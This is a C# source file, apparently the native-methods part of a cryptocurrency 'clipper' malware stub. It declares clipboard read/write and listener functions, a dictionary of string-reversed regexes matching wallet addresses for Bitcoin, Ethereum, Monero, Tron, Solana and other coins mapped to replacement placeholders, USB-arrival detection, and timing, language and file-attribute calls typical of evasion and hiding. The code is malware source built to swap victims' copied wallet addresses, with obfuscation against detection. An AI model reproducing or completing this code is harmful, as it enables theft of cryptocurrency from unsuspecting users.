using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace Stub.Help.Native
{
    public static class NativeMethods
    {
        #region For ClipBoard GetText
        [DllImport("user32.dll")]
        internal static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("user32.dll")]
        public static extern bool IsClipboardFormatAvailable(uint format);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        internal static extern bool EmptyClipboard();

        [DllImport("kernel32.dll")]
        internal static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("kernel32.dll")]
        internal static extern bool GlobalUnlock(IntPtr hMem);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);
        #endregion

        #region USB Detected

        public static Dictionary<Regex, string[]> addresses = new Dictionary<Regex, string[]>()
        {

            {new Regex(StringHelper.ReverseString(@"b\}43,52{]9-1Z-PN-JH-Az-mk-a[]3[b\")), "[BTC3]".Trim().Split('|') }, // Bitcoin кошельки которые начинаются на 3
            {new Regex(StringHelper.ReverseString(@"b\}43,52{]9-1Z-PN-JH-Az-mk-a[]1[b\")), "[BTC1]".Trim().Split('|') }, // Bitcoin кошельки которые начинаются на 1
            {new Regex(StringHelper.ReverseString(@"b\}14,53{]9-0Z-PN-JH-Az-a[]1cb[b\")), "[BC1]".Trim().Split('|') }, // Bitcoin кошельки которые начинаются на bc1
            {new Regex(StringHelper.ReverseString(@"b\}04{]9-0F-Af-a[x0b\")), "[ETH]".Trim().Split('|') }, // Ethereum Сеть ERC20 USDT и т.д
            {new Regex(StringHelper.ReverseString(@"b\}39{]z-mk-aZ-PN-JH-A9-1[]BA9-0[]84[b\")), "[XMR]".Trim().Split('|') }, // Monero которые начинаются на 4 и 8
            {new Regex(StringHelper.ReverseString(@"b\}55{]Z-Az-a9-0[Gb\")), "[XLM]".Trim().Split('|') }, // XLM
            {new Regex(StringHelper.ReverseString(@"b\}43,42{]Z-Az-a9-0[rb\")), "[XRP]".Trim().Split('|') }, // XRP
            {new Regex(StringHelper.ReverseString(@"b\}33,62{]9-1Z-PN-JH-Az-mk-a[]ML[b\")), "[LTC]".Trim().Split('|') }, // Lite Coin
            {new Regex(StringHelper.ReverseString(@"b\}33{]Z-Az-a9-0[]NA[b\")), "[NEC]".Trim().Split('|') }, // NEC
            {new Regex(StringHelper.ReverseString(@"b\}14{]9-0z-a[)p|q(?):hsacnioctib(b\")), "[BCH]".Trim().Split('|') }, // BCH
            {new Regex(StringHelper.ReverseString(@"b\}33{]z-mk-aZ-PN-JH-A9-1[Xb\")), "[DASH]".Trim().Split('|') }, // DASH
            {new Regex(StringHelper.ReverseString(@"b\$}33{]9-1Z-PN-JH-Az-mk-a[Db\")), "[DOGE]".Trim().Split('|') }, // Doge Coin
            {new Regex(StringHelper.ReverseString(@"b\}33,82{]9-0Z-Az-a[Tb\")), "[TRX]".Trim().Split('|') }, // Tron сеть TRC20, USDT и т.д
            {new Regex(StringHelper.ReverseString(@"b\}33{]z-A9-0[1tb\")), "[ZCASH]".Trim().Split('|') }, // ZCashe
            {new Regex(StringHelper.ReverseString(@"b\}93{]9-0z-a[bnbb\")), "[BNB]".Trim().Split('|') }, // Binance coin
            {new Regex(StringHelper.ReverseString(@"b\}84{]_-9-0Z-Az-a[b\")), "[TON]".Trim().Split('|') }, // Ton
            {new Regex(StringHelper.ReverseString(@"b\}44{]z-mk-aZ-PN-JH-A9-1[b\")), "[SOL]".Trim().Split('|') }, // Solana SOL
            {new Regex(StringHelper.ReverseString(@"b\}33,1{]9-1z-mk-aZ-PN-JH-A[b\")), "[DOT]".Trim().Split('|') }, // Polka DOT
        };
        public const int WM_DEVICECHANGE = 0x0219;
        public const int DBT_DEVICEARRIVAL = 0x8000;

        [StructLayout(LayoutKind.Sequential)]
        public struct DEV_BROADCAST_VOLUME
        {
            public int dbcv_size;
            public int dbcv_devicetype;
            public int dbcv_reserved;
            public int dbcv_unitmask;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr RegisterDeviceNotification(IntPtr hRecipient, ref DEV_BROADCAST_VOLUME NotificationFilter, int Flags);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool UnregisterDeviceNotification(IntPtr Handle);
        #endregion

        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        public static extern ulong GetTickCount64();

        [DllImport("kernel32.dll")]
        public static extern ushort GetUserDefaultUILanguage();

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetFileAttributes(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SetFileAttributes(string lpFileName, int dwFileAttributes);
    }
}
